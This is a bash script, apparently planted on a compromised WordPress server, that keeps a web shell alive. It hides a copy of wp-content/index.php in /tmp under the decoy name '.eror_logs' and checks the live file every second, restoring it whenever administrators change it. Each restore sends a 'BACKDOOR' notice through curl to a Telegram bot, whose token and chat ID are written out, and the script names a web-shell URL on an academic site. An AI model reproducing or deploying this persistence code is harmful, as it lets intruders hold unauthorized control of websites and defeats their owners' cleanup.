#!/bin/bash

# ===================================================================================
INDEX_FILE="/var/www/vhosts/web924.kerstin.webhoster.ag/httpdocs/wp-content/index.php"

# ===================================================================================
BACKUP_FOLDER="//tmp"
# 
mkdir -p "$BACKUP_FOLDER"
# ===================================================================================
BACKUP_FILE="$BACKUP_FOLDER/.eror_logs"

# ===================================================================================
TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
CHAT_ID="7234811259"

# ===================================================================================
send_telegram_notification() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message"
}

# ===================================================================================
if [ ! -f "$BACKUP_FILE" ]; then
    cp "$INDEX_FILE" "$BACKUP_FILE"
    echo "Backup pertama dibuat: $BACKUP_FILE"
    send_telegram_notification "Backup pertama dibuat: $BACKUP_FILE"
fi

# ===================================================================================
monitor_file() {
    while true; do
        # ===================================================================================
        CURRENT_CHECKSUM=$(md5sum "$INDEX_FILE" | awk '{ print $1 }')
        BACKUP_CHECKSUM=$(md5sum "$BACKUP_FILE" | awk '{ print $1 }')

        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
           # ===================================================================================
            echo "Change, mengembalikan backup..."
            cp "$BACKUP_FILE" "$INDEX_FILE"
            echo "Dir Parts Web Shell https://www.staibsllg.ac.id/wp-content/uploads/pek.php"
            send_telegram_notification "URL https://www.staibsllg.ac.id/wp-content/uploads/pek.php BACKDOOR DI KEMBALIKAN."
        fi

      # ===================================================================================
        sleep 1
    done
}

# ===================================================================================
monitor_file
